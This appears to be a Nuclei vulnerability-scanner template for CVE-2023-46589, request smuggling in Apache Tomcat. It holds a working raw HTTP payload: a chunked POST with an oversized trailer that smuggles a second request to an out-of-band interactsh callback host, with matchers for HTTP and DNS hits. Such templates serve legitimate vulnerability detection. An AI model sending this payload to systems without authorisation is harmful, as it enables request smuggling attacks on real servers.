id: CVE-2023-46589
info:
  name: Apache Tomcat - Request Smuggling
  author: omkar7505
  severity: high
  reference:
    - https://hackerone.com/reports/2280391

http:
  - raw:
      - |+
        POST /examples/test.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Transfer-Encoding: chunked
        Connection: Keep-Alive
        
        5
        foo=b
        2
        ar
        0
        testtrailer: {{repeat('a', 8179)}}
        a: GET /examples/?this_is_attack HTTP/1.1
        Host: {{interactsh-url}}

    unsafe: true

    matchers-condition: or
    
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"

      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"